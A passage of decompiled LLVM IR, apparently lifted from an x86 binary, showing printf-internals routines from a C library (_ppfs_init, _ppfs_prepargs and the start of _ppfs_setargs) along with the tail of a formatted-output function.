  %v1_805219c = load i32, i32* @ebx, align 4
  %v12_805219c = icmp eq i32 %v0_8052194, %v1_805219c
  %v1_805219e = icmp eq i1 %v12_805219c, false
  br i1 %v1_805219e, label %dec_label_pc_805225f, label %dec_label_pc_80521a4

dec_label_pc_80521a4:                             ; preds = %dec_label_pc_8052171
  %v1_80521a4 = add i32 %v0_8052199, 356
  %v2_80521a4 = inttoptr i32 %v1_80521a4 to i32*
  %v3_80521a4 = load i32, i32* %v2_80521a4, align 4
  %v4_80521a4 = icmp eq i32 %v3_80521a4, 0
  %v1_80521ac = icmp eq i1 %v4_80521a4, false
  br i1 %v1_80521ac, label %dec_label_pc_80521d0, label %dec_label_pc_80521ae

dec_label_pc_80521ae:                             ; preds = %dec_label_pc_80521a4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80521b0 = load i32, i32* @esi, align 4
  %v1_80521b0 = icmp eq i32 %v0_80521b0, 0
  br i1 %v1_80521b0, label %dec_label_pc_80521c6.thread, label %dec_label_pc_80521c6

dec_label_pc_80521c6.thread:                      ; preds = %dec_label_pc_80521ae
  br label %dec_label_pc_8052231

dec_label_pc_80521c6:                             ; preds = %dec_label_pc_80521ae
  %v2_80521b4 = add i32 %v0_8052199, 12
  %v3_80521b4 = inttoptr i32 %v2_80521b4 to i32*
  store i32 0, i32* %v3_80521b4, align 4
  %v1_80521b5 = add i32 %v0_8052199, 384
  %v2_80521b5 = inttoptr i32 %v1_80521b5 to i32*
  %v3_80521b5 = load i32, i32* %v2_80521b5, align 4
  %v5_80521b5 = add i32 %v0_8052199, 8
  %v6_80521b5 = inttoptr i32 %v5_80521b5 to i32*
  store i32 %v3_80521b5, i32* %v6_80521b5, align 4
  %v0_80521bc = load i32, i32* @esi, align 4
  %v2_80521bc = add i32 %v0_8052199, 4
  %v3_80521bc = inttoptr i32 %v2_80521bc to i32*
  store i32 %v0_80521bc, i32* %v3_80521bc, align 4
  %v0_80521bd = load i32, i32* @edi, align 4
  %v3_80521bd = inttoptr i32 %v0_8052199 to i32*
  store i32 %v0_80521bd, i32* %v3_80521bd, align 4
  %v0_80521be = load i32, i32* %stack_var_-364, align 4
  %v4_80521be = call i32 @__stdio_fwrite(i32 %v0_80521be, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80521be, i32* %eax.global-to-local, align 4
  %v0_80521c3 = load i32, i32* @esp, align 4
  %v1_80521c3 = add i32 %v0_80521c3, 16
  %v1_80521c6.pre = load i32, i32* @esi, align 4
  %v12_80521c6 = icmp eq i32 %v4_80521be, %v1_80521c6.pre
  %v1_80521c8 = icmp eq i1 %v12_80521c6, false
  br i1 %v1_80521c8, label %dec_label_pc_805225f, label %dec_label_pc_8052231

dec_label_pc_80521d0:                             ; preds = %dec_label_pc_80521a4
  %v1_80521d0 = add i32 %v0_8052199, 348
  %v2_80521d0 = inttoptr i32 %v1_80521d0 to i32*
  store i32 0, i32* %v2_80521d0, align 4
  %v0_805222d8 = load i32, i32* @esi, align 4
  %v1_805222d9 = icmp eq i32 %v0_805222d8, 0
  %v1_805222f16 = icmp eq i1 %v1_805222d9, false
  br i1 %v1_805222f16, label %dec_label_pc_80521dd, label %dec_label_pc_80521d0.dec_label_pc_8052231.loopexit_crit_edge

dec_label_pc_80521d0.dec_label_pc_8052231.loopexit_crit_edge: ; preds = %dec_label_pc_80521d0
  %v0_8052231.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052231

dec_label_pc_80521dd:                             ; preds = %dec_label_pc_80521d0, %dec_label_pc_805222b
  %v0_80521dd = phi i32 [ %v2_805222b, %dec_label_pc_805222b ], [ %v0_805222d8, %dec_label_pc_80521d0 ]
  %tmp103 = icmp ult i32 %v0_80521dd, 129
  br i1 %tmp103, label %dec_label_pc_80521ec, label %dec_label_pc_80521e7

dec_label_pc_80521e7:                             ; preds = %dec_label_pc_80521dd
  br label %dec_label_pc_80521ec

dec_label_pc_80521ec:                             ; preds = %dec_label_pc_80521dd, %dec_label_pc_80521e7
  %storemerge104 = phi i32 [ 128, %dec_label_pc_80521e7 ], [ %v0_80521dd, %dec_label_pc_80521dd ]
  store i32 %storemerge104, i32* %edx.global-to-local, align 4
  %v0_80521ec = load i32, i32* @esp, align 4
  %v1_80521ec = add i32 %v0_80521ec, 332
  %v2_80521f3 = add i32 %v0_80521ec, -4
  %v3_80521f3 = inttoptr i32 %v2_80521f3 to i32*
  store i32 %v1_80521ec, i32* %v3_80521f3, align 4
  %v0_80521f4 = load i32, i32* %edx.global-to-local, align 4
  %v2_80521f4 = add i32 %v0_80521ec, -8
  %v3_80521f4 = inttoptr i32 %v2_80521f4 to i32*
  store i32 %v0_80521f4, i32* %v3_80521f4, align 4
  %v1_80521f5 = add i32 %v0_80521ec, 340
  store i32 %v1_80521f5, i32* %eax.global-to-local, align 4
  %v2_80521fc = add i32 %v0_80521ec, -12
  %v3_80521fc = inttoptr i32 %v2_80521fc to i32*
  store i32 %v1_80521f5, i32* %v3_80521fc, align 4
  %v1_80521fd = add i32 %v0_80521ec, 204
  store i32 %v1_80521fd, i32* @edi, align 4
  %v2_8052204 = add i32 %v0_80521ec, -16
  %v3_8052204 = inttoptr i32 %v2_8052204 to i32*
  store i32 %v1_80521fd, i32* %v3_8052204, align 4
  %v0_8052205 = call i32 @__GI_wcsrtombs()
  store i32 %v0_8052205, i32* @ebx, align 4
  %v0_805220c = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8052211 = icmp eq i32 %v0_8052205, 0
  br i1 %v1_8052211, label %dec_label_pc_8052227, label %dec_label_pc_8052215

dec_label_pc_8052215:                             ; preds = %dec_label_pc_80521ec
  %v0_8052215 = load i32, i32* @ebp, align 4
  %v2_8052215 = add i32 %v0_805220c, 12
  %v3_8052215 = inttoptr i32 %v2_8052215 to i32*
  store i32 %v0_8052215, i32* %v3_8052215, align 4
  %v1_8052216 = add i32 %v0_805220c, 384
  %v2_8052216 = inttoptr i32 %v1_8052216 to i32*
  %v3_8052216 = load i32, i32* %v2_8052216, align 4
  %v5_8052216 = add i32 %v0_805220c, 8
  %v6_8052216 = inttoptr i32 %v5_8052216 to i32*
  store i32 %v3_8052216, i32* %v6_8052216, align 4
  %v2_805221d = add i32 %v0_805220c, 4
  %v3_805221d = inttoptr i32 %v2_805221d to i32*
  store i32 %v0_8052205, i32* %v3_805221d, align 4
  %v0_805221e = load i32, i32* @edi, align 4
  %v3_805221e = inttoptr i32 %v0_805220c to i32*
  store i32 %v0_805221e, i32* %v3_805221e, align 4
  %v0_805221f = load i32, i32* %stack_var_-364, align 4
  %v4_805221f = call i32 @__stdio_fwrite(i32 %v0_805221f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805221f, i32* %eax.global-to-local, align 4
  %v0_8052224 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052227

dec_label_pc_8052227:                             ; preds = %dec_label_pc_80521ec, %dec_label_pc_8052215
  %v0_805225f50.in = phi i32 [ %v0_805220c, %dec_label_pc_80521ec ], [ %v0_8052224, %dec_label_pc_8052215 ]
  %v1_805222b = phi i32 [ 0, %dec_label_pc_80521ec ], [ %v4_805221f, %dec_label_pc_8052215 ]
  %v0_805225f50 = add i32 %v0_805225f50.in, 16
  %v12_8052227 = icmp eq i32 %v1_805222b, %v0_8052205
  %v1_8052229 = icmp eq i1 %v12_8052227, false
  br i1 %v1_8052229, label %dec_label_pc_805225f, label %dec_label_pc_805222b

dec_label_pc_805222b:                             ; preds = %dec_label_pc_8052227
  %v0_805222b = load i32, i32* @esi, align 4
  %v2_805222b = sub i32 %v0_805222b, %v1_805222b
  %v12_805222b = icmp eq i32 %v2_805222b, 0
  store i32 %v2_805222b, i32* @esi, align 4
  %v1_805222f = icmp eq i1 %v12_805222b, false
  br i1 %v1_805222f, label %dec_label_pc_80521dd, label %dec_label_pc_8052231

dec_label_pc_8052231:                             ; preds = %dec_label_pc_805222b, %dec_label_pc_80521c6.thread, %dec_label_pc_80521d0.dec_label_pc_8052231.loopexit_crit_edge, %dec_label_pc_80521c6
  %v0_8052231 = phi i32 [ %v1_80521c3, %dec_label_pc_80521c6 ], [ %v0_8052231.pre.pre, %dec_label_pc_80521d0.dec_label_pc_8052231.loopexit_crit_edge ], [ %v1_8052199, %dec_label_pc_80521c6.thread ], [ %v0_805225f50, %dec_label_pc_805222b ]
  %v1_8052231 = add i32 %v0_8052231, 8
  %v2_8052231 = inttoptr i32 %v1_8052231 to i32*
  %v3_8052231 = load i32, i32* %v2_8052231, align 4
  store i32 %v3_8052231, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805223a = add i32 %v0_8052231, 368
  %v2_805223a = inttoptr i32 %v1_805223a to i32*
  %v3_805223a = load i32, i32* %v2_805223a, align 4
  store i32 %v3_805223a, i32* @eax, align 4
  %v0_8052241 = call i32 @_charpad()
  store i32 %v0_8052241, i32* %eax.global-to-local, align 4
  %v1_8052246 = load i32, i32* @esp, align 4
  %v2_8052246 = add i32 %v1_8052246, 8
  %v3_8052246 = inttoptr i32 %v2_8052246 to i32*
  %v4_8052246 = load i32, i32* %v3_8052246, align 4
  %v15_8052246 = icmp eq i32 %v0_8052241, %v4_8052246
  %v1_805224a = icmp eq i1 %v15_8052246, false
  br i1 %v1_805224a, label %dec_label_pc_805225f, label %dec_label_pc_805224c

dec_label_pc_805224c:                             ; preds = %dec_label_pc_8052231, %dec_label_pc_8051fc6, %dec_label_pc_8051df4
  %v0_805224c = phi i32 [ %v1_8052246, %dec_label_pc_8052231 ], [ %v0_805224c.pre, %dec_label_pc_8051fc6 ], [ %v1_8051e12, %dec_label_pc_8051df4 ]
  %v1_805224c = add i32 %v0_805224c, 16
  %v2_805224c = inttoptr i32 %v1_805224c to i32*
  %v3_805224c = load i32, i32* %v2_805224c, align 4
  store i32 %v3_805224c, i32* @ebx, align 4
  store i32 %v3_805224c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051d4c.backedge

dec_label_pc_8052257:                             ; preds = %dec_label_pc_8051d8a
  %v1_8052257 = add i32 %v0_8052257, 2
  store i32 %v1_8052257, i32* @ebx, align 4
  br label %dec_label_pc_8051d4c.backedge

dec_label_pc_805225f:                             ; preds = %dec_label_pc_8051d76, %dec_label_pc_8052231, %dec_label_pc_80521c6, %dec_label_pc_8052171, %dec_label_pc_805214a, %dec_label_pc_80520ba, %dec_label_pc_8052035, %dec_label_pc_8052009, %dec_label_pc_8051f9d, %dec_label_pc_8052227
  %v0_805225f = phi i32 [ %v0_805225f50, %dec_label_pc_8052227 ], [ %v0_805225f.pre.pre, %dec_label_pc_8051d76 ], [ %v1_8052246, %dec_label_pc_8052231 ], [ %v1_80521c3, %dec_label_pc_80521c6 ], [ %v1_8052199, %dec_label_pc_8052171 ], [ %v1_805215f, %dec_label_pc_805214a ], [ %v0_8051dec.lcssa, %dec_label_pc_80520ba ], [ %v1_805204d, %dec_label_pc_8052035 ], [ %v1_8052020, %dec_label_pc_8052009 ], [ %v1_8051fbb, %dec_label_pc_8051f9d ]
  %v1_805225f = inttoptr i32 %v0_805225f to i32*
  store i32 -1, i32* %v1_805225f, align 4
  br label %dec_label_pc_8052266

dec_label_pc_8052266:                             ; preds = %dec_label_pc_8051d81, %dec_label_pc_8051cef, %dec_label_pc_8051d0e, %dec_label_pc_805225f
  %v0_8052266 = load i32, i32* @esp, align 4
  %v1_8052266 = inttoptr i32 %v0_8052266 to i32*
  %v2_8052266 = load i32, i32* %v1_8052266, align 4
  store i32 %v2_8052266, i32* %eax.global-to-local, align 4
  %v1_8052269 = add i32 %v0_8052266, 348
  %v1_805226f = inttoptr i32 %v1_8052269 to i32*
  %v2_805226f = load i32, i32* %v1_805226f, align 4
  store i32 %v2_805226f, i32* @ebx, align 4
  ret i32 %v2_8052266

; uselistorder directives
  uselistorder i32 %v1_8052257, { 1, 0 }
  uselistorder i32 %v3_805224c, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8052231, { 1, 0 }
  uselistorder i32 %v2_805222b, { 1, 2, 0 }
  uselistorder i32 %v0_805225f50, { 1, 0 }
  uselistorder i32 %v1_805222b, { 1, 0 }
  uselistorder i32 %v0_805220c, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_8052205, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052199, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_8052171, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805214a, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805211e, { 1, 0, 2 }
  uselistorder i32 %v6_805210b, { 1, 0 }
  uselistorder i32 %v1_8052108, { 1, 0 }
  uselistorder i32 %v0_8052101, { 0, 3, 2, 1 }
  uselistorder i32 %v1_805208b, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_805209b, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8051ffc, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_8051fe2, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_8051f7b, { 1, 0, 2 }
  uselistorder i32 %v1_8051eff, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_8051f52, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_8051edb, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8051e94, { 1, 0 }
  uselistorder i32 %v1_8051ea1, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_8051dec, { 3, 10, 13, 5, 4, 7, 6, 8, 12, 0, 1, 2, 11, 9, 14, 15 }
  uselistorder i32 %v0_8051dec.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_8051de8, { 1, 0 }
  uselistorder i32 %v1_8051de8.pre, { 1, 0 }
  uselistorder i32 %v1_8051de7, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_8051de4, { 1, 0 }
  uselistorder i32 %v2_8051de881, { 1, 0 }
  uselistorder i32 %v3_8051dce, { 1, 0 }
  uselistorder i32 %v1_8051d8a, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8051d56, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051d5a, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8051d44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 6, 5, 2, 3, 1, 0, 4, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 2, 1, 3, 4, 5, 9, 8, 7, 6, 10, 11, 12, 13 }
  uselistorder i32 204, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8052266, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805225f, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8052231, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8052227, { 1, 0 }
  uselistorder label %dec_label_pc_80521ec, { 1, 0 }
  uselistorder label %dec_label_pc_80521dd, { 1, 0 }
  uselistorder label %dec_label_pc_8052171, { 1, 0 }
  uselistorder label %dec_label_pc_8052143, { 1, 0 }
  uselistorder label %dec_label_pc_8052128, { 1, 0 }
  uselistorder label %dec_label_pc_8052112, { 1, 0 }
  uselistorder label %dec_label_pc_80520fe, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80520f2, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805208b, { 1, 0 }
  uselistorder label %dec_label_pc_805207e, { 1, 0 }
  uselistorder label %dec_label_pc_8052009, { 1, 0 }
  uselistorder label %dec_label_pc_8051f9d, { 1, 0 }
  uselistorder label %dec_label_pc_8051f52, { 1, 0 }
  uselistorder label %dec_label_pc_8051f43, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_8051f09, { 1, 0 }
  uselistorder label %dec_label_pc_8051ef0, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8051ea1, { 1, 0 }
  uselistorder label %dec_label_pc_8051e88, { 1, 0 }
  uselistorder label %dec_label_pc_8051e74, { 1, 0 }
  uselistorder label %dec_label_pc_8051e6f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051e50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ddd, { 1, 0 }
  uselistorder label %dec_label_pc_8051dd5, { 1, 0 }
  uselistorder label %dec_label_pc_8051d81, { 1, 0 }
  uselistorder label %dec_label_pc_8051d76, { 1, 0 }
  uselistorder label %dec_label_pc_8051d4c.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052274 = load i32, i32* @esi, align 4
  %v0_8052275 = load i32, i32* @ebx, align 4
  store i32 %v0_8052275, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8052289 = bitcast i32* %arg1 to i8*
  %v4_8052289 = call i32 @__GI_memset(i8* %v3_8052289, i32 0, i32 188)
  store i32 %v4_8052289, i32* %eax.global-to-local, align 4
  %v0_805228e = load i32, i32* @ebx, align 4
  %v1_805228e = add i32 %v0_805228e, 24
  %v2_805228e = inttoptr i32 %v1_805228e to i32*
  %v3_805228e = load i32, i32* %v2_805228e, align 4
  %v4_805228e = add i32 %v3_805228e, -1
  store i32 %v4_805228e, i32* %v2_805228e, align 4
  %v0_8052291 = load i32, i32* @esi, align 4
  %v1_8052291 = load i32, i32* @ebx, align 4
  %v2_8052291 = inttoptr i32 %v1_8052291 to i32*
  store i32 %v0_8052291, i32* %v2_8052291, align 4
  %v0_8052293 = load i32, i32* @ebx, align 4
  %v1_8052293 = add i32 %v0_8052293, 40
  store i32 %v1_8052293, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805229e

dec_label_pc_805229e:                             ; preds = %dec_label_pc_805229e, %entry
  %v0_805229e = phi i32 [ %v1_80522a4, %dec_label_pc_805229e ], [ %v1_8052293, %entry ]
  %v1_805229e = inttoptr i32 %v0_805229e to i32*
  store i32 8, i32* %v1_805229e, align 4
  %v0_80522a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80522a4 = add i32 %v0_80522a4, 4
  store i32 %v1_80522a4, i32* %eax.global-to-local, align 4
  %v0_80522a7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80522a7 = add i32 %v0_80522a7, -1
  %v8_80522a7 = icmp eq i32 %v1_80522a7, 0
  store i32 %v1_80522a7, i32* %edx.global-to-local, align 4
  %v1_80522a8 = icmp eq i1 %v8_80522a7, false
  br i1 %v1_80522a8, label %dec_label_pc_805229e, label %dec_label_pc_80522aa

dec_label_pc_80522aa:                             ; preds = %dec_label_pc_805229e
  %v0_80522aa = load i32, i32* @esi, align 4
  store i32 %v0_80522aa, i32* %eax.global-to-local, align 4
  %v1_80522d520 = inttoptr i32 %v0_80522aa to i8*
  %v2_80522d521 = load i8, i8* %v1_80522d520, align 1
  %v3_80522d522 = zext i8 %v2_80522d521 to i32
  %v5_80522d523 = and i32 %v1_80522a7, -256
  %v6_80522d524 = or i32 %v3_80522d522, %v5_80522d523
  store i32 %v6_80522d524, i32* %edx.global-to-local, align 4
  %v4_80522d725 = icmp eq i8 %v2_80522d521, 0
  %v1_80522d926 = icmp eq i1 %v4_80522d725, false
  br i1 %v1_80522d926, label %dec_label_pc_80522b3, label %dec_label_pc_80522db

dec_label_pc_80522b3:                             ; preds = %dec_label_pc_80522aa, %dec_label_pc_80522d5.backedge
  %v6_80522d529 = phi i32 [ %v6_80522d5, %dec_label_pc_80522d5.backedge ], [ %v6_80522d524, %dec_label_pc_80522aa ]
  %v2_80522d528 = phi i8 [ %v2_80522d5, %dec_label_pc_80522d5.backedge ], [ %v2_80522d521, %dec_label_pc_80522aa ]
  %v0_80522b827 = phi i32 [ %v0_80522b8.be, %dec_label_pc_80522d5.backedge ], [ %v0_80522aa, %dec_label_pc_80522aa ]
  %v10_80522b3 = icmp eq i8 %v2_80522d528, 37
  %v1_80522b6 = icmp eq i1 %v10_80522b3, false
  br i1 %v1_80522b6, label %dec_label_pc_80522d4, label %dec_label_pc_80522b8

dec_label_pc_80522b8:                             ; preds = %dec_label_pc_80522b3
  %v1_80522b8 = add i32 %v0_80522b827, 1
  store i32 %v1_80522b8, i32* %eax.global-to-local, align 4
  %v1_80522b9 = inttoptr i32 %v1_80522b8 to i8*
  %v2_80522b9 = load i8, i8* %v1_80522b9, align 1
  %v11_80522b9 = icmp eq i8 %v2_80522b9, 37
  br i1 %v11_80522b9, label %dec_label_pc_80522d4, label %dec_label_pc_80522be

dec_label_pc_80522be:                             ; preds = %dec_label_pc_80522b8
  %v1_80522c1 = load i32, i32* @ebx, align 4
  %v2_80522c1 = inttoptr i32 %v1_80522c1 to i32*
  store i32 %v1_80522b8, i32* %v2_80522c1, align 4
  %v0_80522c3 = load i32, i32* @ebx, align 4
  %v1_80522c4 = inttoptr i32 %v0_80522c3 to i32*
  %v2_80522c4 = call i32 @_ppfs_parsespec(i32* %v1_80522c4)
  store i32 %v2_80522c4, i32* %eax.global-to-local, align 4
  %v2_80522cc = icmp slt i32 %v2_80522c4, 0
  br i1 %v2_80522cc, label %dec_label_pc_80522df, label %dec_label_pc_80522d0

dec_label_pc_80522d0:                             ; preds = %dec_label_pc_80522be
  %v0_80522d0 = load i32, i32* @ebx, align 4
  %v1_80522d0 = inttoptr i32 %v0_80522d0 to i32*
  %v2_80522d0 = load i32, i32* %v1_80522d0, align 4
  %v4_80522d5.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80522d5.backedge

dec_label_pc_80522d4:                             ; preds = %dec_label_pc_80522b8, %dec_label_pc_80522b3
  %v0_80522d4 = phi i32 [ %v1_80522b8, %dec_label_pc_80522b8 ], [ %v0_80522b827, %dec_label_pc_80522b3 ]
  %v1_80522d4 = add i32 %v0_80522d4, 1
  br label %dec_label_pc_80522d5.backedge

dec_label_pc_80522d5.backedge:                    ; preds = %dec_label_pc_80522d4, %dec_label_pc_80522d0
  %v4_80522d5.be = phi i32 [ %v4_80522d5.pre.pre, %dec_label_pc_80522d0 ], [ %v6_80522d529, %dec_label_pc_80522d4 ]
  %v0_80522b8.be = phi i32 [ %v2_80522d0, %dec_label_pc_80522d0 ], [ %v1_80522d4, %dec_label_pc_80522d4 ]
  store i32 %v0_80522b8.be, i32* %eax.global-to-local, align 4
  %v1_80522d5 = inttoptr i32 %v0_80522b8.be to i8*
  %v2_80522d5 = load i8, i8* %v1_80522d5, align 1
  %v3_80522d5 = zext i8 %v2_80522d5 to i32
  %v5_80522d5 = and i32 %v4_80522d5.be, -256
  %v6_80522d5 = or i32 %v3_80522d5, %v5_80522d5
  store i32 %v6_80522d5, i32* %edx.global-to-local, align 4
  %v4_80522d7 = icmp eq i8 %v2_80522d5, 0
  %v1_80522d9 = icmp eq i1 %v4_80522d7, false
  br i1 %v1_80522d9, label %dec_label_pc_80522b3, label %dec_label_pc_80522d5.dec_label_pc_80522db_crit_edge

dec_label_pc_80522d5.dec_label_pc_80522db_crit_edge: ; preds = %dec_label_pc_80522d5.backedge
  %v0_80522db.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80522db

dec_label_pc_80522db:                             ; preds = %dec_label_pc_80522d5.dec_label_pc_80522db_crit_edge, %dec_label_pc_80522aa
  %v0_80522db = phi i32 [ %v0_80522db.pre, %dec_label_pc_80522d5.dec_label_pc_80522db_crit_edge ], [ %v0_80522aa, %dec_label_pc_80522aa ]
  %v1_80522db = load i32, i32* @ebx, align 4
  %v2_80522db = inttoptr i32 %v1_80522db to i32*
  store i32 %v0_80522db, i32* %v2_80522db, align 4
  br label %dec_label_pc_80522df

dec_label_pc_80522df:                             ; preds = %dec_label_pc_80522be, %dec_label_pc_80522db
  %storemerge = phi i32 [ 0, %dec_label_pc_80522db ], [ -1, %dec_label_pc_80522be ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_80522df = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80522df, i32* @edx, align 4
  %v2_80522e0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80522e0, i32* @ebx, align 4
  store i32 %v0_8052274, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_80522d5, { 1, 0 }
  uselistorder i8 %v2_80522d5, { 1, 2, 0 }
  uselistorder i32 %v0_80522b8.be, { 2, 1, 0 }
  uselistorder i32 %v0_80522b827, { 1, 0 }
  uselistorder i32 %v0_80522aa, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80522a7, { 0, 2, 1 }
  uselistorder i32 %v1_80522a4, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_80522df, { 1, 0 }
  uselistorder label %dec_label_pc_80522b3, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80522e4 = load i32, i32* @esi, align 4
  %v0_80522e5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80522f1 = add i32 %arg1, 24
  %v2_80522f1 = inttoptr i32 %v1_80522f1 to i32*
  %v3_80522f1 = load i32, i32* %v2_80522f1, align 4
  %v2_80522f4 = add i32 %arg1, 76
  %v3_80522f4 = inttoptr i32 %v2_80522f4 to i32*
  store i32 %arg2, i32* %v3_80522f4, align 4
  %tmp8 = icmp slt i32 %v3_80522f1, 1
  br i1 %tmp8, label %dec_label_pc_8052322, label %dec_label_pc_80522fb

dec_label_pc_80522fb:                             ; preds = %entry
  %v1_80522fe = load i32, i32* @ebx, align 4
  %v2_80522fe = add i32 %v1_80522fe, 28
  %v3_80522fe = inttoptr i32 %v2_80522fe to i32*
  store i32 %v3_80522f1, i32* %v3_80522fe, align 4
  %v0_8052301 = load i32, i32* @ebx, align 4
  %v1_8052301 = add i32 %v0_8052301, 24
  %v2_8052301 = inttoptr i32 %v1_8052301 to i32*
  store i32 0, i32* %v2_8052301, align 4
  %v0_8052308 = load i32, i32* @ebx, align 4
  %v1_8052308 = add i32 %v0_8052308, 4
  %v2_8052308 = inttoptr i32 %v1_8052308 to i32*
  store i32 0, i32* %v2_8052308, align 4
  %v0_805230f = load i32, i32* @ebx, align 4
  %v1_805230f = add i32 %v0_805230f, 8
  %v2_805230f = inttoptr i32 %v1_805230f to i32*
  store i32 0, i32* %v2_805230f, align 4
  %v0_8052316 = load i32, i32* @ebx, align 4
  %v1_8052317 = call i32 @_ppfs_setargs(i32 %v0_8052316)
  %v1_805231c = load i32, i32* @ebx, align 4
  %v2_805231c = add i32 %v1_805231c, 24
  %v3_805231c = inttoptr i32 %v2_805231c to i32*
  store i32 %v3_80522f1, i32* %v3_805231c, align 4
  br label %dec_label_pc_8052322

dec_label_pc_8052322:                             ; preds = %entry, %dec_label_pc_80522fb
  %v2_8052322 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80522e5, i32* @ebx, align 4
  store i32 %v0_80522e4, i32* @esi, align 4
  ret i32 %v2_8052322

; uselistorder directives
  uselistorder i32 %v3_80522f1, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052322, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052329 = load i32, i32* @ebx, align 4
  store i32 %v0_8052329, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805232e = add i32 %arg1, 80
